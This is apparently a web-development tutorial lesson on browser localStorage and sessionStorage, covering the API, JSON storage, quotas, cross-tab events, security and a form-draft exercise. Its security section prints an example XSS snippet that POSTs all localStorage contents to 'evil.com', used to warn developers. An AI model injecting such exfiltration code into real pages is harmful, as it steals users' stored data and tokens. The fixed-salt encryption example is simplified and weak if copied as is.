---
title: "LocalStorage and SessionStorage"
---

# LocalStorage and SessionStorage

## Introduction

Sometimes you need to persist data on the client without hitting a server. User preferences, form drafts, shopping carts, authentication tokens—all can be stored locally in the browser.

The **Web Storage API** provides two mechanisms: `localStorage` (persists forever) and `sessionStorage` (clears when the tab closes). Both are simple key-value stores with a synchronous API.

### What We'll Cover

- localStorage API (setItem, getItem, removeItem)
- sessionStorage differences
- Storage limits (~5MB)
- Storing objects (JSON serialization)
- Storage events
- Security considerations

### Prerequisites

- JavaScript fundamentals
- JSON parsing and stringification

---

## localStorage Basics

localStorage persists data with **no expiration**. Data survives browser restarts, system reboots, and persists until explicitly cleared.

### Core Methods

```javascript
// Store a value
localStorage.setItem('username', 'alice');

// Retrieve a value
const username = localStorage.getItem('username');
console.log(username);  // 'alice'

// Remove a specific key
localStorage.removeItem('username');

// Clear everything
localStorage.clear();

// Check number of items
console.log(localStorage.length);  // 0

// Get key by index
const firstKey = localStorage.key(0);
```

### All Values Are Strings

```javascript
localStorage.setItem('count', 42);
const count = localStorage.getItem('count');

console.log(count);         // '42' (string!)
console.log(typeof count);  // 'string'

// Must convert back to number
const num = parseInt(count, 10);
// or
const num2 = Number(count);
```

### Direct Property Access

You can also use dot notation, but methods are preferred:

```javascript
// Works but not recommended
localStorage.theme = 'dark';
console.log(localStorage.theme);  // 'dark'

// Prefer methods for clarity
localStorage.setItem('theme', 'dark');
```

> **Warning:** Direct property access can conflict with built-in properties like `length`, `key`, `setItem`, etc.

---

## Storing Objects and Arrays

localStorage only stores strings. Use JSON for complex data:

```javascript
// Store an object
const user = {
  id: 1,
  name: 'Alice',
  preferences: { theme: 'dark', fontSize: 14 }
};

localStorage.setItem('user', JSON.stringify(user));

// Retrieve and parse
const stored = localStorage.getItem('user');
const parsedUser = JSON.parse(stored);

console.log(parsedUser.name);  // 'Alice'
console.log(parsedUser.preferences.theme);  // 'dark'
```

### Safe Storage Wrapper

```javascript
const storage = {
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (error) {
      console.error('Storage set failed:', error);
      return false;
    }
  },
  
  get(key, defaultValue = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (error) {
      console.error('Storage get failed:', error);
      return defaultValue;
    }
  },
  
  remove(key) {
    localStorage.removeItem(key);
  },
  
  clear() {
    localStorage.clear();
  }
};

// Usage
storage.set('user', { name: 'Alice', age: 30 });
const user = storage.get('user', { name: 'Guest' });
```

### Handling Dates

Dates become strings in JSON. Revive them on parse:

```javascript
const data = {
  event: 'Meeting',
  date: new Date('2025-01-24T10:00:00')
};

localStorage.setItem('event', JSON.stringify(data));

// Parse with date revival
const stored = localStorage.getItem('event');
const parsed = JSON.parse(stored, (key, value) => {
  if (key === 'date') return new Date(value);
  return value;
});

console.log(parsed.date instanceof Date);  // true
```

---

## sessionStorage

sessionStorage works identically to localStorage but with different persistence:

| Feature | localStorage | sessionStorage |
|---------|--------------|----------------|
| Persistence | Forever (until cleared) | Until tab/window closes |
| Shared across tabs | ✅ Yes | ❌ No (tab-specific) |
| Survives refresh | ✅ Yes | ✅ Yes |
| Survives browser restart | ✅ Yes | ❌ No |

### Same API

```javascript
sessionStorage.setItem('token', 'abc123');
const token = sessionStorage.getItem('token');
sessionStorage.removeItem('token');
sessionStorage.clear();
```

### When to Use Each

| Use Case | Storage |
|----------|---------|
| User preferences (theme, language) | localStorage |
| Shopping cart (persistent) | localStorage |
| Authentication token (sensitive) | sessionStorage |
| Form draft (temp save) | sessionStorage |
| One-time notifications | sessionStorage |
| Multi-step wizard state | sessionStorage |

```javascript
// Auth token - clear when tab closes
sessionStorage.setItem('authToken', token);

// User preferences - persist forever
localStorage.setItem('preferences', JSON.stringify({
  theme: 'dark',
  language: 'en'
}));
```

---

## Storage Limits

Both localStorage and sessionStorage have a **~5MB limit per origin**.

### Checking Available Space

```javascript
function getStorageUsage() {
  let total = 0;
  
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      total += (localStorage[key].length + key.length) * 2; // UTF-16 = 2 bytes per char
    }
  }
  
  return {
    used: total,
    usedMB: (total / 1024 / 1024).toFixed(2),
    estimatedLimit: '5MB'
  };
}

console.log(getStorageUsage());
// { used: 1234, usedMB: '0.00', estimatedLimit: '5MB' }
```

### Handling Quota Exceeded

```javascript
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
    return true;
  } catch (error) {
    if (error.name === 'QuotaExceededError') {
      console.error('Storage quota exceeded!');
      // Could: clear old data, notify user, use IndexedDB
      return false;
    }
    throw error;
  }
}
```

### LRU Cache Pattern

Remove oldest items when full:

```javascript
class LRUStorage {
  constructor(maxItems = 100) {
    this.maxItems = maxItems;
    this.keyList = this.getKeyList();
  }
  
  getKeyList() {
    const keys = localStorage.getItem('_lru_keys');
    return keys ? JSON.parse(keys) : [];
  }
  
  saveKeyList() {
    localStorage.setItem('_lru_keys', JSON.stringify(this.keyList));
  }
  
  set(key, value) {
    // Remove if exists (will re-add at end)
    const index = this.keyList.indexOf(key);
    if (index > -1) this.keyList.splice(index, 1);
    
    // Evict oldest if at capacity
    while (this.keyList.length >= this.maxItems) {
      const oldest = this.keyList.shift();
      localStorage.removeItem(oldest);
    }
    
    // Add new item
    this.keyList.push(key);
    localStorage.setItem(key, JSON.stringify(value));
    this.saveKeyList();
  }
  
  get(key) {
    const value = localStorage.getItem(key);
    if (value === null) return null;
    
    // Move to end (most recently used)
    const index = this.keyList.indexOf(key);
    if (index > -1) {
      this.keyList.splice(index, 1);
      this.keyList.push(key);
      this.saveKeyList();
    }
    
    return JSON.parse(value);
  }
}
```

---

## Storage Events

The `storage` event fires when localStorage changes **in another tab/window**:

```javascript
window.addEventListener('storage', (event) => {
  console.log('Storage changed!');
  console.log('Key:', event.key);
  console.log('Old value:', event.oldValue);
  console.log('New value:', event.newValue);
  console.log('URL:', event.url);
  console.log('Storage area:', event.storageArea);
});
```

### Cross-Tab Communication

```javascript
// Tab 1: Send message
function broadcast(type, data) {
  localStorage.setItem('broadcast', JSON.stringify({
    type,
    data,
    timestamp: Date.now()
  }));
  // Clean up immediately (event still fires)
  localStorage.removeItem('broadcast');
}

broadcast('LOGOUT', { reason: 'User initiated' });

// Tab 2: Receive message
window.addEventListener('storage', (event) => {
  if (event.key === 'broadcast' && event.newValue) {
    const message = JSON.parse(event.newValue);
    
    switch (message.type) {
      case 'LOGOUT':
        handleLogout();
        break;
      case 'CART_UPDATE':
        refreshCart(message.data);
        break;
    }
  }
});
```

### Sync State Across Tabs

```javascript
// Theme sync example
window.addEventListener('storage', (event) => {
  if (event.key === 'theme') {
    document.body.setAttribute('data-theme', event.newValue);
  }
});

function setTheme(theme) {
  localStorage.setItem('theme', theme);
  document.body.setAttribute('data-theme', theme);  // Update current tab too
}
```

> **Note:** The storage event does NOT fire in the tab that made the change.

---

## Security Considerations

### What NOT to Store

| ❌ Never Store | Why |
|----------------|-----|
| Passwords | Plain text, accessible to any script |
| Credit card numbers | PCI compliance violation |
| Personal health info | HIPAA concerns |
| Sensitive API keys | Exposed to XSS attacks |

### XSS Vulnerability

Any JavaScript on your page can access localStorage:

```javascript
// If attacker injects script, they can steal data
const allData = { ...localStorage };
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify(allData)
});
```

### Safer Token Storage

For auth tokens, consider:

```javascript
// 1. Use httpOnly cookies (not accessible to JS)
// Set by server:
// Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict

// 2. If must use storage, prefer sessionStorage
sessionStorage.setItem('accessToken', token);

// 3. Use short-lived tokens + refresh tokens
// Store refresh token in httpOnly cookie
// Store access token in memory (not storage)
```

### Data Encryption

For sensitive-ish data, encrypt before storing:

```javascript
// Using SubtleCrypto API (simplified example)
async function encryptAndStore(key, data, password) {
  const encoder = new TextEncoder();
  const dataBytes = encoder.encode(JSON.stringify(data));
  
  // Derive key from password
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    encoder.encode(password),
    'PBKDF2',
    false,
    ['deriveBits', 'deriveKey']
  );
  
  const cryptoKey = await crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt: encoder.encode('salt'), iterations: 100000, hash: 'SHA-256' },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt']
  );
  
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    cryptoKey,
    dataBytes
  );
  
  // Store IV + encrypted data
  const stored = {
    iv: Array.from(iv),
    data: Array.from(new Uint8Array(encrypted))
  };
  
  localStorage.setItem(key, JSON.stringify(stored));
}
```

---

## Complete Example: Settings Manager

```javascript
class SettingsManager {
  constructor(storageKey = 'app_settings') {
    this.storageKey = storageKey;
    this.defaults = {
      theme: 'system',
      fontSize: 16,
      notifications: true,
      language: 'en'
    };
    this.settings = this.load();
    this.listeners = new Set();
    
    // Sync across tabs
    window.addEventListener('storage', (e) => {
      if (e.key === this.storageKey) {
        this.settings = this.load();
        this.notify();
      }
    });
  }
  
  load() {
    try {
      const stored = localStorage.getItem(this.storageKey);
      return stored ? { ...this.defaults, ...JSON.parse(stored) } : { ...this.defaults };
    } catch {
      return { ...this.defaults };
    }
  }
  
  save() {
    try {
      localStorage.setItem(this.storageKey, JSON.stringify(this.settings));
      this.notify();
      return true;
    } catch (error) {
      console.error('Failed to save settings:', error);
      return false;
    }
  }
  
  get(key) {
    return this.settings[key];
  }
  
  set(key, value) {
    this.settings[key] = value;
    return this.save();
  }
  
  reset() {
    this.settings = { ...this.defaults };
    return this.save();
  }
  
  subscribe(callback) {
    this.listeners.add(callback);
    return () => this.listeners.delete(callback);
  }
  
  notify() {
    this.listeners.forEach(cb => cb(this.settings));
  }
}

// Usage
const settings = new SettingsManager();

// Subscribe to changes
const unsubscribe = settings.subscribe((newSettings) => {
  applyTheme(newSettings.theme);
  updateFontSize(newSettings.fontSize);
});

// Update settings
settings.set('theme', 'dark');
settings.set('fontSize', 18);

// Get settings
console.log(settings.get('theme'));  // 'dark'
```

---

## Hands-on Exercise

### Your Task

Build a `FormDraft` class that auto-saves form data as the user types.

### Requirements

1. Save form data on every change (debounced)
2. Restore draft on page load
3. Clear draft on successful submit
4. Handle multiple forms with different keys

<details>
<summary>💡 Hints</summary>

- Use `sessionStorage` (drafts shouldn't persist forever)
- Debounce saves to avoid excessive writes
- Serialize form data with `FormData` + `Object.fromEntries`

</details>

<details>
<summary>✅ Solution</summary>

```javascript
class FormDraft {
  constructor(formElement, draftKey) {
    this.form = formElement;
    this.key = `draft_${draftKey}`;
    this.saveTimeout = null;
    
    this.restoreDraft();
    this.attachListeners();
  }
  
  attachListeners() {
    this.form.addEventListener('input', () => this.scheduleSave());
    this.form.addEventListener('submit', () => this.clearDraft());
  }
  
  scheduleSave() {
    clearTimeout(this.saveTimeout);
    this.saveTimeout = setTimeout(() => this.saveDraft(), 500);
  }
  
  saveDraft() {
    const formData = new FormData(this.form);
    const data = Object.fromEntries(formData);
    sessionStorage.setItem(this.key, JSON.stringify(data));
  }
  
  restoreDraft() {
    const draft = sessionStorage.getItem(this.key);
    if (!draft) return;
    
    try {
      const data = JSON.parse(draft);
      Object.entries(data).forEach(([name, value]) => {
        const field = this.form.elements[name];
        if (field) field.value = value;
      });
    } catch (e) {
      console.error('Failed to restore draft:', e);
    }
  }
  
  clearDraft() {
    sessionStorage.removeItem(this.key);
  }
}

// Usage
const form = document.querySelector('#contact-form');
new FormDraft(form, 'contact');
```

</details>

---

## Summary

✅ **localStorage** persists forever, **sessionStorage** clears on tab close
✅ Both store **strings only** - use JSON for objects
✅ **~5MB limit** per origin - handle QuotaExceededError
✅ Use **storage event** for cross-tab sync
✅ **Never store sensitive data** - vulnerable to XSS
✅ Prefer **sessionStorage** for auth tokens
✅ Create **wrapper classes** for type safety and error handling

**Next:** [IndexedDB Basics](./05-indexeddb-basics.md)

---

## Further Reading

- [MDN Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [web.dev Storage for the Web](https://web.dev/articles/storage-for-the-web)

<!-- 
Sources Consulted:
- MDN Web Storage API: https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
- MDN localStorage: https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage
-->
